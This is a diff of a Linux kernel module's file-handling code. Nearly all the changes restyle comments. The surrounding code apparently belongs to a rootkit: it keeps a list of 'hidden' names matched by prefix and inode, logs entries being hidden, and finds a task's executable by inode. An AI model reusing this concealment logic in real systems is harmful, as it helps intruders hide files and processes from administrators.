@@ -40,10 +40,8 @@ error:
 	return false;
 }
 
-/**
- * callee must put the reference back
- * with path_put after calling this function
- */
+// callee must put the reference back
+// with path_put after calling this function
 bool fs_file_stat(struct path *path, struct kstat *stat)
 {
 #ifdef get_fs
@@ -118,12 +116,10 @@ struct fs_file_node *fs_load_fnode(struct file *f)
 	op->getattr(task_active_pid_ns(current)->proc_mnt, f->f_dentry, &stat);
 #endif
 
-	/**
-     * Once you know the inode number it is very easy to get the
-     * executable full path by relying to find command:
-     *
-     * # find /path/to/mountpoint -inum <inode number> 2>/dev/null
-     */
+	// Once you know the inode number it is very easy to get the
+	// executable full path by relying to find command:
+	//
+	// # find /path/to/mountpoint -inum <inode number> 2>/dev/null
 	fnode->ino = stat.ino;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	fnode->filename = (const char *)f->f_dentry->d_name.name;
@@ -141,17 +137,13 @@ struct fs_file_node *fs_get_file_node(const struct task_struct *task)
 	if (!task)
 		return NULL;
 
-	/**
-     * Not error, it is kernel task
-     * and there is no file associated with it.
-     */
+	// Not error, it is kernel task
+	// and there is no file associated with it.
 	if (!task->mm)
 		return NULL;
 
-	/*
-     * It's a regular task and there is
-     * executable file.
-     */
+	// It's a regular task and there is
+	// executable file.
 	f = task->mm->exe_file;
 	if (!f)
 		return NULL;
@@ -173,14 +165,14 @@ bool fs_search_name(const char *name, u64 ino)
 {
 	struct hidden_names *node, *node_safe;
 	list_for_each_entry_safe (node, node_safe, &names_node, list) {
-		/** This will match any string starting with pattern */
+		// This will match any string starting with pattern
 		if (!strncmp(node->name, name, strlen(node->name))) {
-			/** and this will filter by inode number, if set. */
+			// and this will filter by inode number, if set.
 			if (0 == node->ino || ino == node->ino)
-				return true; /** found match */
+				return true; // found match
 		}
 	}
-	/** not found */
+	// not found
 	return false;
 }
 
@@ -250,9 +242,6 @@ static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent,
 		hn->ino = ino;
 		hn->is_dir = is_dir;
 		hn->ino_parent = ino_parent;
-		/** the gap caused by banned words
-         * is the most fun
-         */
 		prinfo("hide: '%s'\n", hn->name);
 		list_add_tail(&hn->list, &names_node);
 	}
@@ -343,7 +332,7 @@ struct file *fs_kernel_open_file(const char *name)
 		return NULL;
 	}
 
-	/** I won't let it go. Thanks. (kernel joke) */
+	// I won't let it go. Thanks. (kernel joke)
 	filp = filp_open(name, O_CREAT | O_APPEND | O_RDWR | O_LARGEFILE, 0600);
 	if (IS_ERR(filp)) {
 		prerr("Failed to open file %s: (%ld)\n", name, PTR_ERR(filp));
